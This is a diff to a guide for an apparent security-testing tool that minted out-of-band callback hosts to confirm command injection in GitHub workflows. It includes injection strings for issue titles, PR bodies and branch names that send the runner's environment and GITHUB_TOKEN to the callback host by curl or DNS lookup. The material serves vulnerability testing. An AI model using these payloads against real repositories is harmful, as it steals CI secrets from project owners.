@@ -235,25 +235,26 @@ secret as the left label of the callback host.
 
 Confirm readiness with `vigil oob status --json`, then **mint a nonce-tagged
 callback** so the hit is self-correlating instead of eyeballed out of the
-listener log:
+listener log. `mint` binds the nonce under a running client's interactsh id so
+`poll` can correlate it — pass `--client <name>` when several clients run, and
+fire the EXACT host mint prints (`$OOB_HOST`):
 
 ```bash
 # Mint one nonce per injection point; record the correlation context.
-vigil oob mint --technique cmdi --target-url https://github.com/TARGET/REPO --probe-kind exploit
-# -> nonce  <prefix>-<token>
-#    http   http://<prefix>-<token>.oob.example.com/
-#    dns    <prefix>-<token>.oob.example.com
+vigil oob mint --client <name> --technique cmdi --target-url https://github.com/TARGET/REPO --probe-kind exploit
+# → host  <prefix>-<token>.<client-id>.oob.example.com   (= $OOB_HOST)
 ```
 
-Embed the minted host in the injected step — SSRF (`curl http://<host>/` from a
-runner that can reach internal services) or secret exfil (the secret becomes the
-left label of the callback host):
+Embed the EXACT host mint prints (`$OOB_HOST` — the nonce bound under the client
+id; never hand-build a bare `<nonce>.oob...` host) in the injected step — SSRF
+(`curl http://$OOB_HOST/` from a runner that can reach internal services) or
+secret exfil (the secret becomes the left label of the callback host):
 
 ```yaml
 # Issue title / PR body / branch name carrying the minted host:
-"; curl http://<prefix>-<token>.oob.example.com/$(env | base64 -w0) #
+"; curl http://$OOB_HOST/$(env | base64 -w0) #
 # Or DNS-only exfil when egress is HTTP-filtered:
-"; nslookup $(printenv GITHUB_TOKEN | head -c40).<prefix>-<token>.oob.example.com #
+"; nslookup $(printenv GITHUB_TOKEN | head -c40).$OOB_HOST #
 ```
 
 Then **poll for the correlated hit** instead of reading the listener log by hand:
